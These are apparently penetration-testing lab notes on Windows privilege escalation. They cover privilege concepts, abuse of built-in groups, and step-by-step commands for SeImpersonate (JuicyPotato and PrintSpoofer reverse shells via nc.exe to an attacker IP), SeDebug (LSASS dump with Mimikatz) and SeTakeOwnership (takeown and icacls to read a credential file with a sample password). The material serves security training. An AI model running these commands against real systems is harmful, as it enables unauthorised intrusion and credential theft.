# Windows Privileges
- [Windows User Privileges](#windows-user-privileges)
    - [SeImpersonate and SeAssignPrimaryToken](#seimpersonate-and-seassignprimarytoken)
    - [PrintSpoofer and RoguePotato](#printspoofer-and-roguepotato)
    - [SeDebugPrivilege](#sedebugprivilege)
    - [SeTakeOwnershipPrivilege](#setakeownershipprivilege)
- [Windows Group Privileges](#windows-group-privileges)
    - [Windows Built-in Groups](#windows-built-in-groups)



## Windows User Privileges
- **Windows Privileges Overview**
- Privileges in Windows are rights that an account can be granted to perform a variety of operations on the local system.
- Privileges are different from access rights, which a system uses to grant or deny access to securable objects. 
- User and group privileges are stored in a database and granted via an access token when a user logs on to a system.
- Each time a user attempts to perform a privileged action, the system reviews the user's access token to see if the account has the required privileges, and if so, checks to see if they are enabled.

- **Windows Authorization Process**
- Security principals are anything that can be authenticated by the Windows operating system, including user and computer accounts, processes that run in the security context or another user/computer account, or the security groups that these accounts belong to.
- Security principals are the primary way of controlling access to resources on Windows hosts.
- Every single security principal is identified by a unique Security Identifier (SID). When a security principal is created, it is assigned a SID which remains assigned to that principal for its lifetime.
![auth_proc](/images/auth_process.jpg)

- **Rights and Privileges in Windows**
- Windows contains many groups that grant their members powerful rights and privileges. Many of these can be abused to escalate privileges on both a standalone Windows host and within an Active Directory domain environment.Some of these groups are listed below:

|Group	| Description  | 
|:------|:-------------|
|Default Administrators|	Domain Admins and Enterprise Admins are "super" groups.|
|Server Operators|	Members can modify services, access SMB shares, and backup files.|
|Backup Operators|	Members are allowed to log onto DCs locally and should be considered Domain Admins. They can make shadow copies of the SAM/NTDS database, read the registry remotely, and access the file system on the DC via SMB. This group is sometimes added to the local Backup Operators group on non-DCs.|
|Print Operators|	Members can log on to DCs locally and "trick" Windows into loading a malicious driver.|
|Hyper-V Administrators|	If there are virtual DCs, any virtualization admins, such as members of Hyper-V Administrators, should be considered Domain Admins.|
|Account Operators|	Members can modify non-protected accounts and groups in the domain.|
|Remote Desktop Users|	Members are not given any useful permissions by default but are often granted additional rights such as Allow Login Through Remote Desktop Services and can move laterally using the RDP protocol.|
|Remote Management Users|	Members can log on to DCs with PSRemoting (This group is sometimes added to the local remote management group on non-DCs).|
|Group Policy Creator Owners|	Members can create new GPOs but would need to be delegated additional permissions to link GPOs to a container such as a domain or OU.|
|Schema Admins|	Members can modify the Active Directory schema structure and backdoor any to-be-created Group/GPO by adding a compromised account to the default object ACL.|
|DNS Admins|	Members can load a DLL on a DC, but do not have the necessary permissions to restart the DNS server. They can load a malicious DLL and wait for a reboot as a persistence mechanism. Loading a DLL will often result in the service crashing. A more reliable way to exploit this group is to create a WPAD record.|

- **User Rights Assignment**
- Depending on group membership, and other factors such as privileges assigned via domain and local Group Policy, users can have various rights assigned to their account.
- This Microsoft article on [User Rights Assignment](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/security-policy-settings/user-rights-assignment) provides a detailed explanation of each of the user rights that can be set in Windows as well as security considerations applicable to each right.

- Typing the command `whoami /priv` will give you a listing of all user rights assigned to your current user.
- When a privilege is listed for our account in the Disabled state, it means that our account has the specific privilege assigned. Still, it cannot be used in an access token to perform the associated actions until it is enabled.
- Windows does not provide a built-in command or PowerShell cmdlet to enable privileges, so we need some scripting to help us out.
- We will see ways to abuse various privileges throughout this module and various ways to enable specific privileges within our current process.
- One example is this [PowerShell script](https://www.powershellgallery.com/packages/PoshPrivilege/0.3.0.0/Content/Scripts%5CEnable-Privilege.ps1) which can be used to enable certain privileges, or this [script](https://www.leeholmes.com/adjusting-token-privileges-in-powershell/) which can be used to adjust token privileges.

### SeImpersonate and SeAssignPrimaryToken
- In Windows, every process has a token that has information about the account that is running it. 
- These tokens are not considered secure resources, as they are just locations within memory that could be brute-forced by users that cannot read memory. 
- To utilize the token, the SeImpersonate privilege is needed.

- **SeImpersonate Example - JuicyPotato**
```bash
# Connecting with MSSQLClient.py
mssqlclient.py sql_dev@10.129.43.30 -windows-auth

# Enabling xp_cmdshell
SQL> enable_xp_cmdshell

# Confirming Access
SQL> xp_cmdshell whoami

# Checking Account Privileges
SQL> xp_cmdshell whoami /priv

```
- [JuicyPotato](https://github.com/ohpe/juicy-potato) can be used to exploit the SeImpersonate or SeAssignPrimaryToken privileges via DCOM/NTLM reflection abuse.
```bash
# Escalating Privileges Using JuicyPotato
sudo nc -lnvp 8443

SQL> xp_cmdshell c:\tools\JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c c:\tools\nc.exe 10.10.14.3 8443 -e cmd.exe" -t *
# -l is the COM server listening port 
# -p is the program to launch (cmd.exe)
# -a is the argument passed to cmd.exe
# -t is the createprocess call.
```

### PrintSpoofer and RoguePotato
- JuicyPotato doesn't work on Windows Server 2019 and Windows 10 build 1809 onwards. However, PrintSpoofer and RoguePotato can be used to leverage the same privileges and gain NT AUTHORITY\SYSTEM level access.
- This [blog post](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/) goes in-depth on the PrintSpoofer tool, which can be used to abuse impersonation privileges on Windows 10 and Server 2019 hosts where JuicyPotato no longer works.

- Again, connect with mssqlclient.py and use the tool with the -c argument to execute a command.
```bash
# Escalating Privileges using PrintSpoofer
nc -lnvp 8443

SQL> xp_cmdshell c:\tools\PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.14.3 8443 -e cmd"

```
### SeDebugPrivilege
- To run a particular application or service or assist with troubleshooting, a user might be assigned the SeDebugPrivilege instead of adding the account into the administrators group. 
- By default, only administrators are granted this privilege as it can be used to capture sensitive information from system memory, or access/modify kernel and application structures. 
- This right may be assigned to developers who need to debug new system components as part of their day-to-day job.
- We can use ProcDump from the SysInternals suite to leverage this privilege and dump process memory. A good candidate is the Local Security Authority Subsystem Service (LSASS) process, which stores user credentials after a user logs on to a system.
```bat
C:\htb> procdump.exe -accepteula -ma lsass.exe lsass.dmp

# Using Mimikatz
C:\htb> mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 18 2020 19:18:29
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # log
Using 'mimikatz.log' for logfile : OK

mimikatz # sekurlsa::minidump lsass.dmp
Switch to MINIDUMP : 'lsass.dmp'

mimikatz # sekurlsa::logonpasswords
Opening : 'lsass.dmp' file for minidump...
```
> [!TIP]
> It is always a good idea to type "log" before running any commands in "Mimikatz" this way all command output will put output to a ".txt" file. This is especially useful when dumping credentials from a server which may have many sets of credentials in memory.

- **RCE as a SYSTEM**
    - Using this technique, we can elevate our privileges to SYSTEM by launching a child process and using the elevated rights granted to our account via SeDebugPrivilege to alter normal system behavior to inherit the token of a parent process and impersonate it. 
    - If we target a parent process running as SYSTEM (specifying the Process ID (or PID) of the target process or running program), then we can elevate our rights quickly.

    - First, transfer this [PoC](https://github.com/decoder-it/psgetsystem) script over to the target system. Next we just load the script and run it with the following syntax `[MyProcess]::CreateProcessFromParent(<system_pid>,<command_to_execute>,"")`. Note that we must add a third blank argument `""` at the end for the PoC to work properly

```powershell
# open an elevated PowerShell console and tasklist
PS C:\htb> tasklist 

Image Name                     PID Session Name        Session#    Mem Usage
========================= ======== ================ =========== ============
System Idle Process              0 Services                   0          4 K
System                           4 Services                   0        116 K
smss.exe                       340 Services                   0      1,212 K
csrss.exe                      444 Services                   0      4,696 K
wininit.exe                    548 Services                   0      5,240 K
csrss.exe                      556 Console                    1      5,972 K
winlogon.exe                   612 Console                    1     10,408 K


```
- winlogon.exe running under PID 612, which we know runs as SYSTEM on Windows hosts.
![psgetsys](/images/psgetsys_winlogon.jpg)

- We could also use the Get-Process cmdlet to grab the PID of a well-known process that runs as SYSTEM (such as LSASS) and pass the PID directly to the script.
![psgetsyslsass](/images/psgetsys_lsass.jpg)

### SeTakeOwnershipPrivilege
- SeTakeOwnershipPrivilege grants a user the ability to take ownership of any "securable object," meaning Active Directory objects, NTFS files/folders, printers, registry keys, services, and processes.

- This privilege assigns `WRITE_OWNER` rights over an object, meaning the user can change the owner within the object's security descriptor.
- Administrators are assigned this privilege by default.
- **Leveraging the Privilege**
    ```powershell
    PS C:\htb> whoami /priv

    PRIVILEGES INFORMATION
    ----------------------

    Privilege Name                Description                                              State
    ============================= ======================================================= ========
    SeTakeOwnershipPrivilege      Take ownership of files or other objects                Disabled
    SeChangeNotifyPrivilege       Bypass traverse checking                                Enabled
    SeIncreaseWorkingSetPrivilege Increase a process working set                          Disabled
    ```
    1. Enabling SeTakeOwnershipPrivilege: Notice from the output that the privilege is not enabled. We can enable it using this [script](https://raw.githubusercontent.com/fashionproof/EnableAllTokenPrivs/master/EnableAllTokenPrivs.ps1).
    ```powershell
    PS C:\htb> Import-Module .\Enable-Privilege.ps1
    PS C:\htb> .\EnableAllTokenPrivs.ps1
    PS C:\htb> whoami /priv

    PRIVILEGES INFORMATION
    ----------------------
    Privilege Name                Description                              State
    ============================= ======================================== =======
    SeTakeOwnershipPrivilege      Take ownership of files or other objects Enabled
    SeChangeNotifyPrivilege       Bypass traverse checking                 Enabled
    SeIncreaseWorkingSetPrivilege Increase a process working set           Enabled
    ```
    2. Checking File Ownership
    ```powershell
    PS C:\htb> cmd /c dir /q 'C:\Department Shares\Private\IT'

    Volume in drive C has no label.
    Volume Serial Number is 0C92-675B
    
    Directory of C:\Department Shares\Private\IT
    
    06/18/2021  12:22 PM    <DIR>          WINLPE-SRV01\sccm_svc  .
    06/18/2021  12:22 PM    <DIR>          WINLPE-SRV01\sccm_svc  ..
    06/18/2021  12:23 PM                36 ...                    cred.txt
                1 File(s)             36 bytes
                2 Dir(s)  17,079,754,752 bytes free
    ```
    3. Taking Ownership of the File
    ```powershell
    PS C:\htb> takeown /f 'C:\Department Shares\Private\IT\cred.txt'
    
    SUCCESS: The file (or folder): "C:\Department Shares\Private\IT\cred.txt" now owned by user "WINLPE-SRV01\htb-student".
    ```
    4. Confirming Ownership Changed
    ```powershell
    PS C:\htb> Get-ChildItem -Path 'C:\Department Shares\Private\IT\cred.txt' | select name,directory, @{Name="Owner";Expression={(Get-ACL $_.Fullname).Owner}}
    
    Name     Directory                       Owner
    ----     ---------                       -----
    cred.txt C:\Department Shares\Private\IT WINLPE-SRV01\htb-student
    ```
    5. Modifying the File ACL: We may still not be able to read the file and need to modify the file ACL using icacls to be able to read it.
    ```powershell
    PS C:\htb> cat 'C:\Department Shares\Private\IT\cred.txt'

    cat : Access to the path 'C:\Department Shares\Private\IT\cred.txt' is denied.
    At line:1 char:1
    + cat 'C:\Department Shares\Private\IT\cred.txt'
    + ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
        + CategoryInfo          : PermissionDenied: (C:\Department Shares\Private\IT\cred.txt:String) [Get-Content], Unaut
    horizedAccessException
        + FullyQualifiedErrorId : GetContentReaderUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetContentCommand

    PS C:\htb> icacls 'C:\Department Shares\Private\IT\cred.txt' /grant htb-student:F

    processed file: C:\Department Shares\Private\IT\cred.txt
    Successfully processed 1 files; Failed processing 0 files
    ```
    - Reading the file
    ```powershell
    PS C:\htb> cat 'C:\Department Shares\Private\IT\cred.txt'

    NIX01 admin
    
    root:n1X_p0wer_us3er!
    ```

> [!TIP]
> Files of Interest:
> ```
> c:\inetpub\wwwwroot\web.config
> %WINDIR%\repair\sam
> %WINDIR%\repair\system
> %WINDIR%\repair\software, %WINDIR%\repair\security
> %WINDIR%\system32\config\SecEvent.Evt
> %WINDIR%\system32\config\default.sav
> %WINDIR%\system32\config\security.sav
> %WINDIR%\system32\config\software.sav
> %WINDIR%\system32\config\system.sav
> ```


> [!IMPORTANT]
> Take great care when performing a potentially destructive action like changing file ownership, as it could cause an application to stop working or disrupt user(s) of the target object. Changing the ownership of an important file, such as a live web.config file, is not something we would do without consent from our client first. Furthermore, changing ownership of a file buried down several subdirectories (while changing each subdirectory permission on the way down) may be difficult to revert and should be avoided.

## Windows Group Privileges
### Windows Built-in Groups
- 